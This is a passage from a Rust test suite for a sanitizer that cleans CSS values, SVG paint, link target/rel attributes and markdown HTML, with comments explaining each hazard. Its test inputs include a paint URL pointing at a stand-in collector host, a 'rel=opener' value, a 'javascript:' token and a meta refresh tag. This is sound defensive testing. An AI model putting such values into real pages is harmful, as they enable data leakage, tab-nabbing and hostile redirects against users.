        assert!(is_safe_css_value("clamp(1rem, 2vw, 3rem)"));
        assert!(is_safe_css_value(""));
        assert_eq!(sanitize_css_value("a}b"), "");
        assert_eq!(sanitize_css_value("1fr 2fr"), "1fr 2fr");
    }

    #[test]
    fn paint_grammar_refuses_a_paint_server_and_admits_every_named_colour() {
        // `url(https://collector/x)` contains no forbidden CHARACTER, so it
        // passes the generic CSS rule. In an SVG `fill` it names a paint server
        // the user agent FETCHES. Only a positive grammar excludes it.
        assert_eq!(sanitize_paint_value("url(https://collector/x)"), "none");
        assert_eq!(sanitize_paint_value("url(#grad)"), "none");
        // `none` rather than empty, because an EMPTY fill INHERITS the enclosing
        // group's paint instead of clearing it.
        assert_eq!(sanitize_paint_value(""), "none");
        // ALLOW twins. The named colour is the load-bearing one: an enumerated
        // keyword list refuses `steelblue`, and its failure mode is silent —
        // the shape is repainted, not reported.
        for paint in [
            "#39c",
            "#336699",
            "#336699ff",
            "steelblue",
            "currentColor",
            "transparent",
            "context-fill",
            "rgb(1 2 3)",
            "oklch(0.7 0.1 200)",
        ] {
            assert_eq!(sanitize_paint_value(paint), paint, "paint {paint}");
        }
    }

    #[test]
    fn anchor_tokens_are_closed_and_the_safe_pair_is_forced() {
        // The whole finding. `opener` re-enables `window.opener` on a `_blank`
        // link, handing the opened document a live reference to the opening one
        // — and browsers imply `noopener` there, which is exactly why an
        // explicit `opener` mattered: it OVERRIDES a user-agent default no
        // document can know the version floor of.
        let (target, rel) = sanitize_link_anchor(Some("_blank"), Some("opener"));
        assert_eq!(target.as_deref(), Some("_blank"));
        assert_eq!(rel.as_deref(), Some("noopener noreferrer"));

        // The pair is forced with no declared rel at all.
        let (_, rel) = sanitize_link_anchor(Some("_blank"), None);
        assert_eq!(rel.as_deref(), Some("noopener noreferrer"));

        // A target outside the closed set is OMITTED, not substituted: omitting
        // says truthfully that the document declared nothing this renderer could
        // honour, where substituting would put a value in the DOM the author
        // never wrote.
        for t in ["victim", "_parent", "_top"] {
            let (target, _) = sanitize_link_anchor(Some(t), None);
            assert_eq!(target, None, "target {t}");
        }

        // ALLOW twin — `_self` with a descriptive token forces nothing.
        let (target, rel) = sanitize_link_anchor(Some("_self"), Some("nofollow"));
        assert_eq!(target.as_deref(), Some("_self"));
        assert_eq!(rel.as_deref(), Some("nofollow"));

        // A link declaring neither slot emits neither attribute.
        let (target, rel) = sanitize_link_anchor(None, None);
        assert_eq!(target, None);
        assert_eq!(rel, None);
    }

    #[test]
    fn the_protocol_sweep_is_tag_anchored_and_the_element_match_is_delimited() {
        // Unanchored, the sweep rewrote VISIBLE PROSE: a document explaining the
        // hazard could not state it, because the literal token in a `<code>`
        // element's TEXT was replaced with `about:blank`.
        assert_eq!(
            sanitize_markdown_html("<p>Never write <code>javascript:</code> here</p>"),
            "<p>Never write <code>javascript:</code> here</p>"
        );
        // `<metadata>` is not `<meta>` and `<linearGradient>` is not `<link>`,
        // both of which the drawing builder emits.
        assert_eq!(
            sanitize_markdown_html("<p><meter value=\"0.6\"></meter></p>"),
            "<p><meter value=\"0.6\"></meter></p>"
        );
        assert!(!sanitize_markdown_html("<meta http-equiv=\"refresh\">").contains("refresh"));
    }
}
